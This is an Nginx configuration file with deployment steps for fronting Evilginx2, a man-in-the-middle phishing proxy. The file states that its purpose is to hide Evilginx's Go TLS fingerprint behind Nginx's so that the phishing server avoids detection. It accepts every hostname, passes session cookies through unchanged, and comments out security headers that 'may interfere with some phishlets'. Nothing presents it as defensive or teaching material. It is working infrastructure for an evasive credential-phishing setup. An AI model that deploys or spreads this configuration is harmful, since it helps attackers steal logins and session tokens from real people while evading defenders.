# Nginx Reverse Proxy Configuration for Evilginx
# This masks the Go TLS fingerprint with Nginx's fingerprint
#
# Usage:
#   1. Copy this to /etc/nginx/sites-available/evilginx
#   2. Create symlink: ln -s /etc/nginx/sites-available/evilginx /etc/nginx/sites-enabled/
#   3. Update DOMAIN_NAME and certificate paths
#   4. Run: nginx -t && systemctl reload nginx
#   5. Start evilginx with: ./evilginx2 -p 8443 -bind 127.0.0.1

# Upstream definition for evilginx
upstream evilginx_backend {
    server 127.0.0.1:8443;
    keepalive 64;
}

# HTTP to HTTPS redirect
server {
    listen 80;
    listen [::]:80;
    server_name _;
    
    # Redirect all HTTP to HTTPS
    return 301 https://$host$request_uri;
}

# Main HTTPS server block
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    
    # Wildcard server name - accepts all hostnames
    server_name _;
    
    # SSL Certificate Configuration
    # Option 1: Let's Encrypt wildcard (recommended)
    # ssl_certificate /etc/letsencrypt/live/DOMAIN_NAME/fullchain.pem;
    # ssl_certificate_key /etc/letsencrypt/live/DOMAIN_NAME/privkey.pem;
    
    # Option 2: Self-signed (for testing)
    ssl_certificate /etc/nginx/ssl/evilginx.crt;
    ssl_certificate_key /etc/nginx/ssl/evilginx.key;
    
    # Modern SSL configuration (TLS 1.2+)
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    
    # SSL session settings
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;
    
    # Security headers (optional - may interfere with some phishlets)
    # add_header X-Frame-Options "SAMEORIGIN" always;
    # add_header X-Content-Type-Options "nosniff" always;
    
    # Logging
    access_log /var/log/nginx/evilginx_access.log;
    error_log /var/log/nginx/evilginx_error.log;
    
    # Proxy settings
    location / {
        proxy_pass https://evilginx_backend;
        proxy_ssl_verify off;
        
        # Preserve original headers
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Forwarded-Host $host;
        proxy_set_header X-Forwarded-Port $server_port;
        
        # WebSocket support (for some sites)
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
        
        # Buffer settings
        proxy_buffering on;
        proxy_buffer_size 4k;
        proxy_buffers 8 4k;
        proxy_busy_buffers_size 8k;
        
        # Don't change response headers
        proxy_pass_header Set-Cookie;
        proxy_pass_header P3P;
    }
}
